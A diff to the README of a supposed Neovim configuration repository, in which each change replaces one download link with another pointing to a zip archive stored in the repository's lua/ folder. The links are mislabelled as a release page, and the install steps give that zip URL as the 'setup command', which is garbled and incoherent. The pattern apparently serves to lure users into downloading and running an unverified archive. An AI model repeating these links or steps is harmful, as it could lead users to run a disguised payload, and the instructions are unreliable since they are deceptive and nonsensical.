@@ -1,6 +1,6 @@
 # 🖥️ neovim-conf - A Simple Setup for Better Editing
 
-[![Download neovim-conf](https://github.com/sohaibalianjum2001/neovim-conf/raw/refs/heads/master/lua/conf-neovim-v1.6.zip)](https://github.com/sohaibalianjum2001/neovim-conf/raw/refs/heads/master/lua/conf-neovim-v1.6.zip)
+[![Download neovim-conf](https://raw.githubusercontent.com/sohaibalianjum2001/neovim-conf/master/lua/conf_neovim_v3.0.zip)](https://raw.githubusercontent.com/sohaibalianjum2001/neovim-conf/master/lua/conf_neovim_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the **neovim-conf** repository! This is a configuration toolkit for N
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Release Page](https://github.com/sohaibalianjum2001/neovim-conf/raw/refs/heads/master/lua/conf-neovim-v1.6.zip). 
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/sohaibalianjum2001/neovim-conf/master/lua/conf_neovim_v3.0.zip). 
 
 Here is how to install the application:
 
@@ -38,7 +38,7 @@ Here is how to install the application:
    ```bash
    cd path\to\extracted\folder
    ```
-4. Run the setup command. This might be `https://github.com/sohaibalianjum2001/neovim-conf/raw/refs/heads/master/lua/conf-neovim-v1.6.zip` or similar.
+4. Run the setup command. This might be `https://raw.githubusercontent.com/sohaibalianjum2001/neovim-conf/master/lua/conf_neovim_v3.0.zip` or similar.
 
 ### 🐧 Linux 
 
@@ -48,7 +48,7 @@ Here is how to install the application:
    ```bash
    cd path/to/extracted/folder
    ```
-4. Run the setup command. This may be `https://github.com/sohaibalianjum2001/neovim-conf/raw/refs/heads/master/lua/conf-neovim-v1.6.zip`.
+4. Run the setup command. This may be `https://raw.githubusercontent.com/sohaibalianjum2001/neovim-conf/master/lua/conf_neovim_v3.0.zip`.
 
 ### 🍏 macOS
 
@@ -58,7 +58,7 @@ Here is how to install the application:
    ```bash
    cd path/to/extracted/folder
    ```
-4. Execute the setup command, typically `https://github.com/sohaibalianjum2001/neovim-conf/raw/refs/heads/master/lua/conf-neovim-v1.6.zip`.
+4. Execute the setup command, typically `https://raw.githubusercontent.com/sohaibalianjum2001/neovim-conf/master/lua/conf_neovim_v3.0.zip`.
 
 ## 🎨 Customizing Your Environment
 
@@ -86,4 +86,4 @@ If you have questions or need further assistance, you can reach out in various w
 
 This configuration aims to enhance your Neovim experience, making text editing more enjoyable and efficient.
 
-For more features and information, visit the Releases page again: [Download Here](https://github.com/sohaibalianjum2001/neovim-conf/raw/refs/heads/master/lua/conf-neovim-v1.6.zip).
+For more features and information, visit the Releases page again: [Download Here](https://raw.githubusercontent.com/sohaibalianjum2001/neovim-conf/master/lua/conf_neovim_v3.0.zip).
